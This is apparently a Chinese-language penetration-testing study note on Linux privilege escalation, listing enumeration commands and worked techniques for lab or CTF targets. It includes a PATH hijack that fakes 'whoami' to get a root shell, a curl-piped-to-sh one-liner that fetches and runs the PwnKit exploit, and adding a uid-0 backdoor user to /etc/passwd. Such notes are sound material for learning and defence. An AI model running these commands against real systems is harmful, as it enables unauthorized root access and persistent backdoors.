# 渗透测试中的提权思路
## 1. 查找提权点
### 系统版本号
```
uname -r //查看系统版本号
```
上网搜索相关漏洞
### 看敏感目录
```
/var/www
/home
```
### 当前目录的权限信息
```
ls -la

Example:
$ ls -la
total 32
drwxr-xr-x  5 user group  4096 Aug 15 10:20 .
drwxr-xr-x 12 user group  4096 Aug 15 09:30 ..
-rw-r--r--  1 user group   220 Aug 15 09:20 .bash_logout
-rw-r--r--  1 user group  3771 Aug 15 09:20 .bashrc
drwxr-xr-x  2 user group  4096 Aug 15 10:18 .config
-rw-r--r--  1 user group   807 Aug 15 09:20 .profile
-rw-r--r--  1 user group     0 Aug 15 10:20 example.txt
drwxr-xr-x  2 user group  4096 Aug 15 10:18 my_folder

d/- 目录/文件
_________ 所有者权限 所属用户组的权限 其他用户的权限
硬链数
所有者及其ta所属的组
最后修改时间
有 . 为文件，无 . 则为目录
```
有个特殊的粘滞位 `t`
粘滞位（sticky bit)：
- **`t`**：粘滞位的存在意味着只有文件的所有者、目录的所有者或超级用户（root）才能删除或重命名目录中的文件。这常用于公共目录（如 `/tmp`），以防止用户删除其他用户的文件。
### `sudo` 命令 （最好不是 www-data 用户）
使用 `sudo` 列出可执行命令
```
sudo -l
```
查看当前用户可以使用 `sudo` 执行的命令列表。
https://gtfobins.github.io/ 配合 `sudo -l` 食用更佳。
### crontab 
`/etc/crontab` https://crontab.guru/
```
cat /etc/crontab // 看有没有 root 权限的定时任务
```
### SUID位文件，最好有 root 的 SUID 位
查找 SUID (Set User ID) 位的文件，这种文件在执行时可以以文件所有者的权限运行，比如 `passwd` 就是一个设置了 SUID 的文件，普通用户在使用时可以执行 root(也就是文件的所有者) 的权限来修改自己的密码。如果要用 root 权限，则需要找出 root 所拥有的文件。
```
find / -perm -4000 -type f 2>/dev/null
```
### 列出以 root 运行的进程
查看以root运行的进程，只是显示当前的，可能要多看几次
```
ps aux | grep -i 'root' --color=auto
```
### 上传 `pspy64` 
`pspy64` 可以一直监视，弥补上面那个命令的缺陷，但动作有点大
https://github.com/DominicBreuker/pspy/releases
## 2. 特殊情况
### 2.1用户名欺骗 `whoami`
```
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main() {
    printf("checking if you are tom...\n");
    // 使用popen打开一个子进程执行"whoami"命令，并以读模式打开文件指针f
    FILE* f = popen("whoami", "r");

    char user[80]; // 定义一个字符数组，用于存储用户名
    fgets(user, 80, f); // 从文件指针f中读取最多79个字符到user数组中，留一个空位给'\0'

    printf("you are: %s\n", user); // 打印出当前用户名
    //printf("your euid is: %i\n", geteuid()); // 注释掉的代码，用于打印有效用户ID

    // 检查user数组的前3个字符是否与字符串"tom"相匹配
    if (strncmp(user, "tom", 3) == 0) {
        printf("access granted.\n"); // 如果是"tom"，则打印"access granted."
        setuid(geteuid()); // 将真实用户ID设置为有效用户ID，通常用于提权
        execlp("sh", "sh", (char *) 0); // 执行一个新的shell，替换当前进程
    }
}

// 根据上述程序，对策如下：
// 当前目录为 
echo "printf "tom"" > whoami // 将 `printf "tom"` 写入文件 whoami，如果没有这个文件，就创建

chmod +x whoami // 加执行文件

export PATH=/tmp:$PATH // 将 /tmp 放在环境变量的最前面，覆盖掉原来的 whoami
```
### 2.2 `pkexec`
 前提条件为能找到这个 SUID 文件
`sudo` 和 `pkexec` 都是提权。
`sudo` 主要用于命令行界面（CLI），而 `pkexec` 主要用于图形用户界面（GUI）
https://github.com/ly4k/PwnKit
```
sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
```
上次成功的时候是切换到用户自己文件夹中。
### 2.3 与备份相关
与备份相关的可能是定时任务，并且执行备份的用户的权限应该很高。
### 2.4 在 `/etc/passwd` 中添加用户
```
/opt/devstuff/test.py
```
代码内容如下
```python
#!/usr/bin/python

import sys

if len (sys.argv) != 3 : # sys.argv 是命令行参数数组，包含了命令行参数 
    print ("Usage: python test.py read append")
    sys.exit (1) # 类似于 C 语言的 return 1;

else :
    f = open(sys.argv[1], "r") # 读取 ./test 后第一个输入的文件名
    output = (f.read()) # 先存在 output 中

    f = open(sys.argv[2], "a") # 再打开 ./test 后第二个输入的文件名，并且是 append (附加)的形式
    f.write(output) # 在结尾写上 output 的内容
    f.close()
```

上述代码作用是从 read 处读取一个文件，并将其内容附加到 append 文件结尾，并且这两个操作还是 root 权限，那么就可以往一些敏感文件加信息了。可以往 `/etc/passwd` 中添加信息，也就是加一个 root 用户。

openssl 一般用于 `/etc/passwd` 文件的加密
```
openssl passwd -1 -salt passion 123456
```

得到下面这个经 md5 加密的密码，带有盐值 passion
```
$1$passion$6B1Neow110enwwaaEaWQs.
```

接下来利用 `test`将 `passion:$1$passion$6B1Neow110enwwaaEaWQs.:0:0::/root:/bin/bash` 附加到 `/etc/passwd` 中
```
cd /tmp

echo 'passion:$1$passion$6B1Neow110enwwaaEaWQs.:0:0::/root:/bin/bash' > passion

cd /opt/devstuff/dist/test

sudo ./test /tmp/passion /etc/passwd
```

提权成功
```
su passion
123456
```

结束
## 3. 其它
### python3本地开服务器
```
python3 -m http.server 80
```
### 稳定 shell (python版reverse shell)
```
python3 -c 'import pty; pty.spawn("/bin/bash")'

export TERM=xterm
```

